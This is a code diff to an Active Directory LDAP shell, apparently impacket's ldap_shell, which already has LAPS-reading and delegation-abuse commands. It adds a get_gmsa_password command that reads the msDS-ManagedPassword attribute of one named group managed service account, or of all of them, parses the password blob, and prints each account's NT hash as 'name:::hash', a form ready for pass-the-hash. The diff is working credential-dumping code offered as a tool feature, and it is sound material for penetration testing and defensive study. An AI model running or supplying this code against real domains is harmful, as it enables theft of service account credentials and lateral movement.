@@ -17,15 +17,52 @@ import string
 import sys
 import cmd
 import random
+import binascii
 import ldap3
 from ldap3.core.results import RESULT_UNWILLING_TO_PERFORM
 from ldap3.utils.conv import escape_filter_chars
 from six import PY2
 import shlex
 from impacket import LOG
+from Cryptodome.Hash import MD4
 from ldap3.protocol.microsoft import security_descriptor_control
 from impacket.ldap.ldaptypes import ACCESS_ALLOWED_OBJECT_ACE, ACCESS_MASK, ACCESS_ALLOWED_ACE, ACE, OBJECTTYPE_GUID_MAP
 from impacket.ldap import ldaptypes
+from impacket.structure import Structure, hexdump
+
+class MSDS_MANAGEDPASSWORD_BLOB(Structure):
+    structure = (
+        ('Version','<H'),
+        ('Reserved','<H'),
+        ('Length','<L'),
+        ('CurrentPasswordOffset','<H'),
+        ('PreviousPasswordOffset','<H'),
+        ('QueryPasswordIntervalOffset','<H'),
+        ('UnchangedPasswordIntervalOffset','<H'),
+        ('CurrentPassword',':'),
+        ('PreviousPassword',':'),
+        #('AlignmentPadding',':'),
+        ('QueryPasswordInterval',':'),
+        ('UnchangedPasswordInterval',':'),
+    )
+
+    def __init__(self, data = None):
+        Structure.__init__(self, data = data)
+
+    def fromString(self, data):
+        Structure.fromString(self,data)
+
+        if self['PreviousPasswordOffset'] == 0:
+            endData = self['QueryPasswordIntervalOffset']
+        else:
+            endData = self['PreviousPasswordOffset']
+
+        self['CurrentPassword'] = self.rawData[self['CurrentPasswordOffset']:][:endData - self['CurrentPasswordOffset']]
+        if self['PreviousPasswordOffset'] != 0:
+            self['PreviousPassword'] = self.rawData[self['PreviousPasswordOffset']:][:self['QueryPasswordIntervalOffset']-self['PreviousPasswordOffset']]
+
+        self['QueryPasswordInterval'] = self.rawData[self['QueryPasswordIntervalOffset']:][:self['UnchangedPasswordIntervalOffset']-self['QueryPasswordIntervalOffset']]
+        self['UnchangedPasswordInterval'] = self.rawData[self['UnchangedPasswordIntervalOffset']:]
 
 
 class LdapShell(cmd.Cmd):
@@ -501,7 +538,47 @@ class LdapShell(cmd.Cmd):
             print("LAPS Password: %s" % password)
         else:
             print("Unable to Read LAPS Password for Computer")
-
+    
+    def do_get_gmsa_password(self, target):
+        if target.lower() == "all":
+            print("Dumping all gMSA passwords")
+            try:
+               success = self.client.search(self.domain_dumper.root, '(&(ObjectClass=msDS-GroupManagedServiceAccount))', attributes=['sAMAccountName','msDS-ManagedPassword'])
+               if success:
+                   for entry in self.client.response:
+                       sam = entry['attributes']['sAMAccountName']
+                       data = entry['attributes']['msDS-ManagedPassword']
+                       blob = MSDS_MANAGEDPASSWORD_BLOB()
+                       blob.fromString(data)
+                       hash = MD4.new ()
+                       hash.update (blob['CurrentPassword'][:-2])
+                       passwd = binascii.hexlify(hash.digest()).decode("utf-8")
+                       userpass = sam + ':::' + passwd
+                       print(userpass)
+            except:
+                pass    
+                
+                
+        elif target != "":
+            print("Dumping %s gMSA password" % target)
+            try:
+               success = self.client.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(target), attributes=['sAMAccountName','msDS-ManagedPassword'])
+               if success:
+                   for entry in self.client.response:
+                       sam = entry['attributes']['sAMAccountName']
+                       data = entry['attributes']['msDS-ManagedPassword']
+                       blob = MSDS_MANAGEDPASSWORD_BLOB()
+                       blob.fromString(data)
+                       hash = MD4.new ()
+                       hash.update (blob['CurrentPassword'][:-2])
+                       passwd = binascii.hexlify(hash.digest()).decode("utf-8")
+                       userpass = sam + ':::' + passwd
+                       print(userpass)
+            except:
+                pass  
+        else:
+            print("Expected target name")     
+    
     def do_grant_control(self, line):
         args = shlex.split(line)
 
@@ -648,6 +725,7 @@ class LdapShell(cmd.Cmd):
  get_user_groups user - Retrieves all groups this user is a member of.
  get_group_users group - Retrieves all members of a group.
  get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
+ get_gmsa_password account - Retrieves the gMSA password associated with a given service account (sAMAccountName). 
  grant_control target grantee - Grant full control of a given target object (sAMAccountName) to the grantee (sAMAccountName).
  set_dontreqpreauth user true/false - Set the don't require pre-authentication flag to true or false.
  set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).
